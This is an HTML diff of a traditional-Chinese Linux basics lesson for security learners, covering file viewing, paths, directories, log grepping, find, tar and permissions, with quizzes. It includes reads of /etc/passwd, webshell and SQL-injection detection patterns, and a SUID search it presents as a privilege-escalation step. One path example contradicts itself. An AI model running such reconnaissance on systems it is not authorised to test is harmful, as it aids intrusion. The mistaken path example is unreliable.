+              <tr><td class="mono">5yy</td><td>複製游標下 5 行</td></tr>
+              <tr><td class="mono">p / P</td><td>在游標後貼上 / 在游標前貼上</td></tr>
+              <tr><td rowspan="2"><strong>復原</strong></td><td class="mono">u</td><td>復原（Undo）上一步操作</td></tr>
+              <tr><td class="mono">Ctrl+R</td><td>重做（Redo）</td></tr>
+              <tr><td rowspan="2"><strong>搜尋</strong></td><td class="mono">/keyword</td><td>向下搜尋，按 n 跳下一個，N 跳上一個</td></tr>
+              <tr><td class="mono">*</td><td>搜尋游標所在單詞</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="quiz">
+          <div class="quiz-badge">小測驗</div>
+          <div class="quiz-q">在 VIM 的普通模式下，你想刪除當前游標所在的行，應該輸入什麼？</div>
+          <div class="quiz-opts">
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">A</span><code>del</code></div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">B</span><code>rm</code></div>
+            <div class="quiz-opt" onclick="checkQ(this,true)"><span class="quiz-opt-key">C</span><code>dd</code></div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">D</span><code>:delete</code></div>
+          </div>
+          <div class="quiz-exp">正確！在 VIM 普通模式下，<code>dd</code> 是刪除整行的快捷鍵（同時將內容放入暫存區，可用 p 貼上）。<code>5dd</code> 可以刪除 5 行。記住：VIM 的普通模式下，所有按鍵都是命令，不會直接輸入文字。</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L4-1  echo / cat / head -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l4-1">
+        <h2>echo / cat / head — 文件內容查看</h2>
+
+        <div class="cmd-grid">
+          <div class="cmd-card">
+            <div class="cmd-name">echo</div>
+            <div class="cmd-syntax">echo [選項] [字串]</div>
+            <div class="cmd-desc">輸出文字到終端或重定向到文件。<code>echo "text" > file</code> 覆寫，<code>echo "text" >> file</code> 追加。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">cat</div>
+            <div class="cmd-syntax">cat [選項] [文件]</div>
+            <div class="cmd-desc">concatenate，顯示文件全部內容，適合小文件。<code>cat -n</code> 顯示行號，<code>cat file1 file2</code> 合併顯示多個文件。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">head</div>
+            <div class="cmd-syntax">head [-n 行數] [文件]</div>
+            <div class="cmd-desc">顯示文件開頭幾行，默認 10 行。<code>head -n 5 file</code> 顯示前 5 行。適合查看大文件開頭。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">less / more</div>
+            <div class="cmd-syntax">less [文件]</div>
+            <div class="cmd-desc">分頁顯示文件，適合大文件。<code>less</code> 比 <code>more</code> 功能更強，支持向上翻。按 q 退出，/ 搜尋。</div>
+          </div>
+        </div>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">文件查看實戰</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># echo：輸出文字</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">echo</span> <span class="str">"Hello World"</span>
+<span class="out">Hello World</span>
+
+<span class="comment"># echo 寫入文件（> 覆寫，>> 追加）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">echo</span> <span class="str">"This is line 1"</span> > <span class="path">test.txt</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">echo</span> <span class="str">"This is line 2"</span> >> <span class="path">test.txt</span>
+
+<span class="comment"># cat：查看文件內容</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cat</span> <span class="path">test.txt</span>
+<span class="out">This is line 1
+This is line 2</span>
+
+<span class="comment"># cat 顯示行號</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cat</span> <span class="flag">-n</span> <span class="path">/etc/passwd</span> | <span class="cmd">head</span> <span class="flag">-5</span>
+<span class="out">     1  root:x:0:0:root:/root:/bin/bash
+     2  bin:x:1:1:bin:/bin:/sbin/nologin
+     3  daemon:x:2:2:daemon:/sbin:/sbin/nologin
+     4  adm:x:3:4:adm:/var/adm:/sbin/nologin
+     5  lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span>
+
+<span class="comment"># 查看日誌文件前 20 行（應急響應常用）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">head</span> <span class="flag">-n 20</span> <span class="path">/var/log/secure</span>
+</div>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-label">應急響應：查看 /etc/passwd</div>
+          <p>入侵排查時，<code>cat /etc/passwd</code> 可以列出所有用戶帳號。重點關注：是否有不明來源的帳號（尤其是 UID=0 的帳號）、shell 不是 /sbin/nologin 但應該被禁用的服務帳號。攻擊者入侵後常會創建後門帳號，通過這個命令可以快速發現。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L4-2  路徑 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l4-2">
+        <h2>相對路徑與絕對路徑</h2>
+        <p>在 Linux 中，指定文件位置有兩種方式：絕對路徑和相對路徑。理解這兩者的差異是避免操作失誤的關鍵。</p>
+
+        <div class="terms-grid">
+          <div class="term-card">
+            <div class="term-name">絕對路徑 (Absolute Path)</div>
+            <div class="term-def">從根目錄 <code>/</code> 開始的完整路徑，不依賴當前目錄。例如：<code>/etc/nginx/nginx.conf</code>、<code>/home/user/documents/report.txt</code>。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">相對路徑 (Relative Path)</div>
+            <div class="term-def">相對於當前工作目錄的路徑。<code>.</code> 代表當前目錄，<code>..</code> 代表上一層目錄。例如：在 /home/user 時，<code>./documents/report.txt</code> 等於 <code>/home/user/documents/report.txt</code>。</div>
+          </div>
+        </div>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">路徑使用範例</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 當前位置：/var/www</span>
+<span class="prompt">[root@localhost www]#</span> <span class="cmd">pwd</span>
+<span class="out">/var/www</span>
+
+<span class="comment"># 相對路徑：進入 html 子目錄</span>
+<span class="prompt">[root@localhost www]#</span> <span class="cmd">cd</span> <span class="path">html</span>
+<span class="comment"># 等同於：cd /var/www/html</span>
+
+<span class="comment"># 相對路徑：回到上一層 var 目錄</span>
+<span class="prompt">[root@localhost html]#</span> <span class="cmd">cd</span> <span class="path">../..</span>
+<span class="comment"># 等同於：cd /</span>
+
+<span class="comment"># 絕對路徑（從任何位置都有效）</span>
+<span class="prompt">[root@localhost /]#</span> <span class="cmd">cat</span> <span class="path">/etc/hostname</span>
+<span class="out">web-server-01</span>
+
+<span class="comment"># 快速識別：以 / 開頭的是絕對路徑</span>
+/etc/passwd       <span class="comment">← 絕對路徑</span>
+./config.txt      <span class="comment">← 相對路徑（當前目錄）</span>
+../logs/error.log <span class="comment">← 相對路徑（上層的 logs 目錄）</span>
+</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L4-3  Linux 目錄結構 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l4-3">
+        <h2>Linux 重要目錄結構詳解</h2>
+        <p>Linux 採用 FHS（Filesystem Hierarchy Standard）定義了目錄結構。<strong>熟悉目錄結構是進行應急響應、日誌分析和提權攻擊的基礎知識。</strong></p>
+
+        <div class="dir-tree">
+<span class="dir">/</span>  <span class="desc">← 根目錄，一切的起點</span>
+├── <span class="danger">/root</span>           <span class="desc">← root 用戶的 Home 目錄（僅 root 可讀）</span>
+├── <span class="important">/home</span>          <span class="desc">← 普通用戶的 Home 目錄 (/home/username)</span>
+├── <span class="important">/etc</span>           <span class="desc">← 系統配置文件（最重要的目錄之一）</span>
+│   ├── <span class="danger">passwd</span>      <span class="desc">← 用戶帳號信息（應急排查必看）</span>
+│   ├── <span class="danger">shadow</span>      <span class="desc">← 加密密碼（只有 root 可讀）</span>
+│   ├── <span class="file">ssh/</span>         <span class="desc">← SSH 配置目錄</span>
+│   ├── <span class="file">nginx/</span>       <span class="desc">← Nginx 配置（Web 安全評估關注）</span>
+│   └── <span class="file">crontab</span>      <span class="desc">← 計劃任務（後門排查關注點）</span>
+├── <span class="important">/var</span>           <span class="desc">← 可變資料</span>
+│   ├── <span class="dir">log/</span>         <span class="desc">← 系統日誌（應急響應核心目錄）</span>
+│   │   ├── <span class="important">secure</span>   <span class="desc">← SSH 登入、sudo 相關日誌</span>
+│   │   ├── <span class="important">messages</span> <span class="desc">← 系統一般日誌</span>
+│   │   └── <span class="file">nginx/</span>   <span class="desc">← Web 訪問日誌</span>
+│   └── <span class="dir">www/</span>         <span class="desc">← Web 網站根目錄（Webshell 排查重點）</span>
+├── <span class="important">/tmp</span>           <span class="desc">← 臨時文件（所有用戶可寫，攻擊者常用）</span>
+├── <span class="dir">/bin</span>           <span class="desc">← 基本命令（ls, cp, rm 等）</span>
+├── <span class="dir">/sbin</span>          <span class="desc">← 系統管理命令（iptables, fdisk 等）</span>
+├── <span class="dir">/usr</span>           <span class="desc">← 用戶程序與數據</span>
+│   ├── <span class="dir">bin/</span>         <span class="desc">← 用戶安裝的應用程式</span>
+│   └── <span class="dir">local/</span>       <span class="desc">← 手動安裝的程序</span>
+├── <span class="file">/proc</span>          <span class="desc">← 進程信息虛擬文件系統（動態生成）</span>
+│   └── <span class="file">[PID]/</span>       <span class="desc">← 每個進程的詳細信息</span>
+├── <span class="file">/sys</span>           <span class="desc">← 硬體設備資訊</span>
+├── <span class="file">/dev</span>           <span class="desc">← 設備文件（硬碟: sda, sdb）</span>
+├── <span class="file">/boot</span>          <span class="desc">← 引導文件（Linux Kernel）</span>
+└── <span class="file">/mnt /media</span>    <span class="desc">← 掛載點（外接硬碟、CD-ROM）</span>
+        </div>
+
+        <div class="callout danger">
+          <div class="callout-label">入侵排查重點目錄</div>
+          <p>進行應急響應時，必須重點檢查以下目錄和文件：<code>/tmp</code>（攻擊者常在此放置惡意文件）、<code>/var/www/html</code>（Webshell 排查）、<code>/etc/passwd</code> 和 <code>/etc/shadow</code>（後門帳號）、<code>/etc/crontab</code>（計劃任務後門）、<code>~/.ssh/authorized_keys</code>（SSH 後門公鑰）。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L4-4  tail / grep / 重定向 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l4-4">
+        <h2>tail / grep 命令與重定向符號</h2>
+        <p>這三個工具組合在一起，是日誌分析的核心利器。無論是應急響應還是日常運維，你會幾乎每天用到它們。</p>
+
+        <div class="cmd-grid">
+          <div class="cmd-card">
+            <div class="cmd-name">tail</div>
+            <div class="cmd-syntax">tail [-n 行數] [-f] [文件]</div>
+            <div class="cmd-desc">顯示文件尾部內容，默認 10 行。<code>-f</code> 實時追蹤文件更新（監控日誌神器），<code>-n 100</code> 顯示最後 100 行。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">grep</div>
+            <div class="cmd-syntax">grep [選項] 關鍵字 [文件]</div>
+            <div class="cmd-desc">在文件中搜尋符合條件的行。<code>-i</code> 忽略大小寫，<code>-r</code> 遞迴搜尋目錄，<code>-v</code> 反向（不包含關鍵字），<code>-n</code> 顯示行號。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">&gt; / &gt;&gt;</div>
+            <div class="cmd-syntax">命令 > 文件 / 命令 >> 文件</div>
+            <div class="cmd-desc"><code>&gt;</code> 輸出重定向（覆蓋），<code>&gt;&gt;</code> 輸出重定向（追加）。將命令的輸出儲存到文件而不是顯示在終端。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">| （管道）</div>
+            <div class="cmd-syntax">命令1 | 命令2</div>
+            <div class="cmd-desc">將左側命令的輸出作為右側命令的輸入。是 Linux 中最強大的組合工具之一。可以串聯多個命令。</div>
+          </div>
+        </div>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">日誌分析實戰（應急響應場景）</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 實時監控 SSH 登入日誌（Ctrl+C 停止）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">tail</span> <span class="flag">-f</span> <span class="path">/var/log/secure</span>
+
+<span class="comment"># 在 SSH 日誌中搜尋登入失敗記錄</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">grep</span> <span class="str">"Failed password"</span> <span class="path">/var/log/secure</span>
+<span class="out">Jan  1 10:23:01 server sshd[1234]: Failed password for root from 192.168.10.5 port 49832 ssh2</span>
+
+<span class="comment"># 統計某個 IP 嘗試暴力破解的次數</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">grep</span> <span class="str">"Failed password"</span> <span class="path">/var/log/secure</span> | <span class="cmd">grep</span> <span class="str">"192.168.10.5"</span> | <span class="cmd">wc -l</span>
+<span class="out">1534</span>
+<span class="comment"># 1534 次！這是暴力破解攻擊</span>
+
+<span class="comment"># 搜尋成功登入的記錄</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">grep</span> <span class="str">"Accepted password"</span> <span class="path">/var/log/secure</span>
+
+<span class="comment"># 在 Web 訪問日誌中搜尋 SQL 注入特徵</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">grep</span> <span class="flag">-i</span> <span class="str">"union.*select\|or.*1=1\|' --"</span> <span class="path">/var/log/nginx/access.log</span>
+
+<span class="comment"># 搜尋 Webshell 關鍵字（eval, base64_decode）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">grep</span> <span class="flag">-r</span> <span class="str">"eval(base64_decode"</span> <span class="path">/var/www/html/</span>
+
+<span class="comment"># 將搜尋結果儲存到文件</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">grep</span> <span class="str">"Failed password"</span> <span class="path">/var/log/secure</span> > <span class="path">/tmp/failed_logins.txt</span>
+</div>
+        </div>
+
+        <div class="quiz">
+          <div class="quiz-badge">小測驗</div>
+          <div class="quiz-q">你需要從 /var/log/nginx/access.log 中找出所有狀態碼為 404 的請求，並統計總數。以下哪個命令組合是正確的？</div>
+          <div class="quiz-opts">
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">A</span><code>find "404" /var/log/nginx/access.log | count</code></div>
+            <div class="quiz-opt" onclick="checkQ(this,true)"><span class="quiz-opt-key">B</span><code>grep " 404 " /var/log/nginx/access.log | wc -l</code></div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">C</span><code>cat /var/log/nginx/access.log | find 404</code></div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">D</span><code>tail /var/log/nginx/access.log | grep 404</code></div>
+          </div>
+          <div class="quiz-exp">正確！<code>grep " 404 " file</code> 搜尋包含「 404 」（注意空格）的行，管道給 <code>wc -l</code>（word count 的行數模式）統計行數。選項 A 語法錯誤，選項 C 的 cat+find 不是正確用法，選項 D 的 tail 只顯示尾部行，不是全部。</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L5-1, L5-2, L5-3  命令總結 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l5-1">
+        <h2>Linux 基礎命令總結速查表</h2>
+        <p>到目前為止已經學習了大量的 Linux 命令，這裡做一個完整的彙總，方便複習和查閱。</p>
+        <div class="table-wrap">
+          <table class="dt">
+            <thead><tr><th>類別</th><th>命令</th><th>常用語法</th><th>功能說明</th></tr></thead>
+            <tbody>
+              <tr><td rowspan="4"><strong>目錄操作</strong></td><td class="mono">pwd</td><td>pwd</td><td>顯示當前目錄</td></tr>
+              <tr><td class="mono">cd</td><td>cd /path 或 cd ~</td><td>切換目錄</td></tr>
+              <tr><td class="mono">mkdir</td><td>mkdir -p dir/sub</td><td>創建目錄</td></tr>
+              <tr><td class="mono">tree</td><td>tree -L 2</td><td>樹狀顯示目錄</td></tr>
+              <tr><td rowspan="6"><strong>文件操作</strong></td><td class="mono">ls</td><td>ls -lah</td><td>列出目錄內容</td></tr>
+              <tr><td class="mono">touch</td><td>touch file.txt</td><td>創建空文件</td></tr>
+              <tr><td class="mono">cp</td><td>cp -rp src dst</td><td>複製文件/目錄</td></tr>
+              <tr><td class="mono">mv</td><td>mv old new</td><td>移動/重命名</td></tr>
+              <tr><td class="mono">rm</td><td>rm -rf dir</td><td>刪除文件/目錄</td></tr>
+              <tr><td class="mono">find</td><td>find / -name "*.php"</td><td>搜尋文件</td></tr>
+              <tr><td rowspan="5"><strong>文件內容</strong></td><td class="mono">cat</td><td>cat -n file</td><td>顯示全文</td></tr>
+              <tr><td class="mono">head</td><td>head -n 20 file</td><td>顯示開頭N行</td></tr>
+              <tr><td class="mono">tail</td><td>tail -f log</td><td>顯示尾部/實時追蹤</td></tr>
+              <tr><td class="mono">less</td><td>less file</td><td>分頁查看</td></tr>
+              <tr><td class="mono">grep</td><td>grep -rn "str" dir/</td><td>搜尋文字</td></tr>
+              <tr><td rowspan="3"><strong>系統信息</strong></td><td class="mono">uname</td><td>uname -a</td><td>系統版本信息</td></tr>
+              <tr><td class="mono">df</td><td>df -h</td><td>磁碟使用量</td></tr>
+              <tr><td class="mono">free</td><td>free -h</td><td>記憶體使用量</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="content-block" id="l5-2">
+        <h2>file / which / find / xargs 命令詳解</h2>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">進階文件搜尋命令</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># file：識別文件類型（不依賴副檔名）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">file</span> <span class="path">/usr/bin/python3</span>
+<span class="out">ELF 64-bit LSB executable, x86-64, dynamically linked</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">file</span> <span class="path">shell.php</span>
+<span class="out">shell.php: PHP script, ASCII text  ← 可以識別偽裝成圖片的腳本</span>
+
+<span class="comment"># which：查找命令的絕對路徑</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">which</span> <span class="path">python3</span>
+<span class="out">/usr/bin/python3</span>
+
+<span class="comment"># find：強大的文件搜尋工具</span>
+<span class="comment"># 搜尋最近24小時內修改的文件（應急響應常用）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">find</span> <span class="path">/var/www/html</span> <span class="flag">-mtime -1</span>
+
+<span class="comment"># 搜尋SUID文件（提權路徑）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">find</span> <span class="path">/</span> <span class="flag">-perm -4000</span> <span class="flag">-type f</span> 2>/dev/null
+
+<span class="comment"># 搜尋所有 .php 文件</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">find</span> <span class="path">/var/www</span> <span class="flag">-name</span> <span class="str">"*.php"</span>
+
+<span class="comment"># xargs：將標準輸入轉為命令參數</span>
+<span class="comment"># 找出所有 .php 文件並搜尋 eval 關鍵字（批次處理）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">find</span> <span class="path">/var/www</span> <span class="flag">-name</span> <span class="str">"*.php"</span> | <span class="cmd">xargs</span> <span class="cmd">grep</span> <span class="flag">-l</span> <span class="str">"eval"</span>
+</div>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-label">資安提權知識點</div>
+          <p><code>find / -perm -4000 -type f 2>/dev/null</code> 是 Linux 提權的關鍵命令！這個命令搜尋所有設置了 SUID 位的文件。SUID（Set User ID）文件在執行時會以文件擁有者的身份（通常是 root）運行，如果這些程式存在漏洞，低權限用戶可以利用它們提升到 root。在 Stage 4 的 Linux 提權章節會深入學習。</p>
+        </div>
+      </div>
+
+      <div class="content-block" id="l5-3">
+        <h2>時間同步與常用系統命令</h2>
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">時間同步與系統狀態命令</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 查看系統時間</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">date</span>
+<span class="out">Wed Jan  1 10:00:00 CST 2025</span>
+
+<span class="comment"># 設定時間同步（NTP）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">yum install</span> <span class="flag">-y</span> <span class="path">chrony</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">systemctl</span> <span class="flag">enable --now</span> chronyd
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">chronyc</span> <span class="flag">tracking</span>
+
+<span class="comment"># 查看運行中的進程</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ps</span> <span class="flag">aux</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ps</span> <span class="flag">aux</span> | <span class="cmd">grep</span> <span class="str">nginx</span>
+
+<span class="comment"># 即時進程監控（top 的進化版）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">top</span>
+
+<span class="comment"># 查看網路連線（應急排查重點）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ss</span> <span class="flag">-tlnp</span>    <span class="comment"># 查看監聽端口</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ss</span> <span class="flag">-anp</span>     <span class="comment"># 查看所有連線（包括外連）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">netstat</span> <span class="flag">-tulnp</span>  <span class="comment"># 舊版命令</span>
+
+<span class="comment"># 查看登入的用戶</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">who</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">w</span>           <span class="comment"># 更詳細，包括在執行什麼命令</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">last</span>        <span class="comment"># 歷史登入記錄</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">lastb</span>       <span class="comment"># 失敗的登入嘗試</span>
+</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L6-1  tar -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l6-1">
+        <h2>tar 壓縮解壓縮</h2>
+        <p><code>tar</code> 是 Linux 中最常用的打包工具，可以結合 gzip、bzip2 等工具進行壓縮。</p>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">tar 命令大全（記住這四條就夠了）</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># ===== 打包並壓縮 =====</span>
+<span class="comment"># czf = Create（創建）+ z（gzip 壓縮）+ f（指定文件名）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">tar</span> <span class="flag">-czf</span> <span class="path">backup.tar.gz</span> <span class="path">/var/www/html</span>
+<span class="comment"># 生成 backup.tar.gz</span>
+
+<span class="comment"># ===== 查看壓縮包內容（不解壓）=====</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">tar</span> <span class="flag">-tzf</span> <span class="path">backup.tar.gz</span>
+
+<span class="comment"># ===== 解壓縮 =====</span>
+<span class="comment"># xzf = eXtract（解壓）+ z（gzip）+ f（指定文件名）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">tar</span> <span class="flag">-xzf</span> <span class="path">backup.tar.gz</span>
+<span class="comment"># 解壓到當前目錄</span>
+
+<span class="comment"># 解壓到指定目錄</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">tar</span> <span class="flag">-xzf</span> <span class="path">backup.tar.gz</span> <span class="flag">-C</span> <span class="path">/tmp/restore</span>
+
+<span class="comment"># bzip2 壓縮（壓縮比更高，但更慢）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">tar</span> <span class="flag">-cjf</span> <span class="path">archive.tar.bz2</span> <span class="path">/data</span>
+
+<span class="comment"># 其他常見格式</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">zip</span> <span class="flag">-r</span> <span class="path">archive.zip</span> <span class="path">/data</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">unzip</span> <span class="path">archive.zip</span> <span class="flag">-d</span> <span class="path">/tmp/</span>
+</div>
+        </div>
+
+        <div class="callout tip">
+          <div class="callout-label">記憶技巧</div>
+          <p>tar 的參數邏輯：<strong>c（創建）/ x（解壓）/ t（查看）</strong> + <strong>z（gzip/.gz）/ j（bzip2/.bz2）</strong> + <strong>f（指定文件名，必須放最後）</strong>。壓縮用 czf，解壓用 xzf，一旦記住這個規律就不會忘了。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L6-2  Linux 權限 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l6-2">
+        <h2>Linux 權限配置詳解</h2>
+        <p>Linux 的權限系統是其安全模型的核心。理解和正確配置權限，是防止未授權訪問的第一道防線，也是進行提權攻擊分析的基礎。</p>
+
+        <h3>權限的組成</h3>
+        <div class="perm-visual">
+          <div style="font-size:0.72rem;color:var(--text3);margin-bottom:12px;letter-spacing:0.1em;">文件權限字串結構：-rwxr-xr--</div>
+          <div class="perm-row">
+            <div class="perm-cell type">-</div>
+            <div class="perm-sep"></div>
+            <div class="perm-cell r">r</div>
+            <div class="perm-cell w">w</div>
+            <div class="perm-cell x">x</div>
+            <div class="perm-sep"></div>
+            <div class="perm-cell r">r</div>
+            <div class="perm-cell dash">-</div>
+            <div class="perm-cell x">x</div>
+            <div class="perm-sep"></div>
+            <div class="perm-cell r">r</div>
+            <div class="perm-cell dash">-</div>
+            <div class="perm-cell dash">-</div>
+            <div class="perm-label">← 文件類型 | 擁有者(Owner) | 群組(Group) | 其他人(Others)</div>
+          </div>
+          <div style="margin-top:16px;font-size:0.75rem;line-height:2;color:var(--text2);">
+            文件類型：<span style="color:var(--accent)">-</span>(普通文件)  <span style="color:var(--accent)">d</span>(目錄)  <span style="color:var(--accent)">l</span>(符號連結)  <span style="color:var(--accent)">b</span>(塊設備)
+            <br>r(read=4) w(write=2) x(execute=1)  例：rwx=7  r-x=5  r--=4
+          </div>
+        </div>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">chmod 與 chown 權限管理命令</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment">===== chmod：修改文件權限 =====</span>
+
+<span class="comment"># 數字方式：rwxr-xr-- = 754</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">chmod</span> <span class="flag">755</span> <span class="path">script.sh</span>
+<span class="comment"># 755 = rwxr-xr-x（擁有者全權，群組/其他可讀執行）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">chmod</span> <span class="flag">644</span> <span class="path">config.txt</span>
+<span class="comment"># 644 = rw-r--r--（擁有者可讀寫，其他只讀）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">chmod</span> <span class="flag">600</span> <span class="path">~/.ssh/id_rsa</span>
+<span class="comment"># 600 = rw-------（只有擁有者可讀寫，SSH 私鑰必須這樣設）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">chmod</span> <span class="flag">-R 755</span> <span class="path">/var/www/html</span>
+<span class="comment"># -R 遞迴設定整個目錄</span>
+
+<span class="comment"># 符號方式：更直觀</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">chmod</span> <span class="flag">u+x</span> <span class="path">script.sh</span>   <span class="comment"># 給擁有者加執行權限</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">chmod</span> <span class="flag">o-r</span> <span class="path">secret.txt</span>  <span class="comment"># 去掉其他人的讀取權限</span>
+
+<span class="comment">===== chown：修改文件擁有者 =====</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">chown</span> <span class="flag">nginx:nginx</span> <span class="path">/var/www/html</span>
+<span class="comment"># 將 /var/www/html 的擁有者改為 nginx 用戶和群組</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">chown</span> <span class="flag">-R www-data:www-data</span> <span class="path">/var/www</span>
+</div>
+        </div>
+
+        <div class="callout warn">
+          <div class="callout-label">危險的 777 權限</div>
+          <p><code>chmod 777 /var/www/html</code> 表示任何用戶都可以讀、寫、執行此目錄下的所有文件！這是非常嚴重的安全隱患。如果 Web 目錄是 777，攻擊者一旦找到文件上傳漏洞，就能直接上傳 Webshell 並執行。Web 目錄應設為 755（目錄）和 644（文件），且擁有者為 nginx/www-data，而非 root。</p>
+        </div>
+
+        <div class="quiz">
+          <div class="quiz-badge">小測驗</div>
+          <div class="quiz-q">一個文件的權限為 <code>-rwxr-x---</code>，請問這個文件的八進制權限數字是什麼？</div>
+          <div class="quiz-opts">
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">A</span>777</div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">B</span>644</div>
